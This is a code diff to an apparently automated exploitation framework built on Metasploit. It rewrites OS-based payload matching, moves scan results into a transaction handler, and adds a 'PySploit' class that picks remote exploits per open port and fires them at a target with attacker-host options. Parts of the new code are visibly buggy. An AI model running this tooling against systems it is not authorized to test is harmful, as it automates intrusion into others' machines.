+            elif self.os_real == 2 and tokens[1] in set(['solaris', 'unix', 'multi']):
                 os_match_payloads.append(payload)
-            elif self.os_real == 3 and tokens & set(['osx', 'unix', 'multi']):
+            elif self.os_real == 3 and tokens[1] in set(['osx', 'unix', 'multi']):
                 os_match_payloads.append(payload)
-            elif self.os_real == 4 and tokens & set(['netware', 'multi']):
+            elif self.os_real == 4 and tokens[1] in set(['netware', 'multi']):
                 os_match_payloads.append(payload)
-            elif self.os_real == 5 and tokens & set(['linux', 'unix', 'multi']):
+            elif self.os_real == 5 and tokens[1] in set(['linux', 'unix', 'multi']):
                 os_match_payloads.append(payload)
-            elif self.os_real == 6 and tokens & set(['irix', 'unix', 'multi']):
+            elif self.os_real == 6 and tokens[1] in set(['irix', 'unix', 'multi']):
                 os_match_payloads.append(payload)
-            elif self.os_real == 7 and tokens & set(['hpux', 'unix', 'multi']):
+            elif self.os_real == 7 and tokens[1] in set(['hpux', 'unix', 'multi']):
                 os_match_payloads.append(payload)
-            elif self.os_real == 8 and tokens & set(['freebsd', 'unix', 'bsdi', 'multi']):
+            elif self.os_real == 8 and tokens[1] in set(['freebsd', 'unix', 'bsdi', 'multi']):
                 os_match_payloads.append(payload)
-            elif self.os_real == 9 and tokens & set(['firefox', 'multi']):
+            elif self.os_real == 9 and tokens[1] in set(['firefox', 'multi']):
                 os_match_payloads.append(payload)
-            elif self.os_real == 10 and tokens & set(['dialup', 'multi']):
+            elif self.os_real == 10 and tokens[1] in set(['dialup', 'multi']):
                 os_match_payloads.append(payload)
-            elif self.os_real == 11 and tokens & set(['bsdi', 'unix', 'freebsd', 'multi']):
+            elif self.os_real == 11 and tokens[1] in set(['bsdi', 'unix', 'freebsd', 'multi']):
                 os_match_payloads.append(payload)
-            elif self.os_real == 12 and tokens & set(['apple_ios', 'unix', 'osx', 'multi']):
+            elif self.os_real == 12 and tokens[1] in set(['apple_ios', 'unix', 'osx', 'multi']):
                 os_match_payloads.append(payload)
-            elif self.os_real == 13 and tokens & set(['android', 'linux', 'multi']):
+            elif self.os_real == 13 and tokens[1] in set(['android', 'linux', 'multi']):
                 os_match_payloads.append(payload)
-            elif self.os_real == 14 and tokens & set(['aix', 'unix', 'multi']):
+            elif self.os_real == 14 and tokens[1] in set(['aix', 'unix', 'multi']):
                 os_match_payloads.append(payload)
             elif self.os_real == 15:
                 os_match_payloads.append(payload)
@@ -1970,12 +1892,42 @@ class MetasploitCannon(CannonPlug):
         for key in openPorts.keys():
             del openPorts[key]['target_path']
             del openPorts[key]['exploit']
-        os = str(self.os_type[self.os_real])
-        # self.scanningevent = DBHANDLE.insert_scanning_log(openPorts, self.msgrpc_user, self.rhost, os, closed_ports)['event']
-        self.db_scanning_logs = {'openports': openPorts, 'username': self.msgrpc_user, 'localip': self.rhost, 'os': os, "closed_ports": closed_ports}
+        os_str = str(self.os_type[self.os_real])
+        self.trans_handler.set_open_ports(openPorts)
+        self.trans_handler.set_closed_ports(closed_ports)
+        self.trans_handler.set_os(os_str)
 
 
+class PySploit:
+    def __init__(self, username: str, agent_ip: str, target_ip: str, cve_data: dict, trans_handler: TransactionHandler):
+        self.agent_ip = agent_ip
+        self.target_ip = target_ip
+        self.cve_data = cve_data
+        self.trans_handler = trans_handler
+        self.username = username
+    
+    def run(self):
+        print("Starting Exploitation using PySploit")
+        for port, port_data in self.trans_handler.scanning_event['openports'].items():
+            exploits = DBHANDLE.get_compatible_py_exploits(self.trans_handler.os, port_data['prod_name'], 'remote')['data']
+            for exploit in exploits:
+                options = {}
+                edbid = exploit['edbid']
+                for op, default_val in exploit['options'].items():
+                    if op == 'RHOST':
+                        options[op] = self.target_ip
+                    elif op == 'RPORT':
+                        options[op] = port
+                    elif op == 'LHOST':
+                        options[op] = self.agent_ip
+                    else:
+                        option[op] = default_val
+                requirements = exploit['requirements']
+                data = {'exploit': edbid, 'options': options, 'requirments': requirements}
+                response = send_command(self.username, data)
+                print("Data: " + str(data) + "\nResponse: " + str(data))
 
+                # TODO Add PySploit Data to Database
 
 
 if __name__ == '__main__':
@@ -1984,8 +1936,5 @@ if __name__ == '__main__':
     log.setLevel(logging.ERROR)
     FlaskAPP = FlaskAPI()
     CORS(FlaskAPP)
-    # APP = socketio.WSGIApp(socketIOServer, FlaskAPP)
-    # # APP.wsgi_app.run()
-    # eventlet.wsgi.server(eventlet.listen(('', 8080)), APP)
     FlaskAPP.wsgi_app = socketio.WSGIApp(socketIOServer, FlaskAPP.wsgi_app)
     FlaskAPP.run(host="0.0.0.0", port=8080, debug=False, threaded=True)
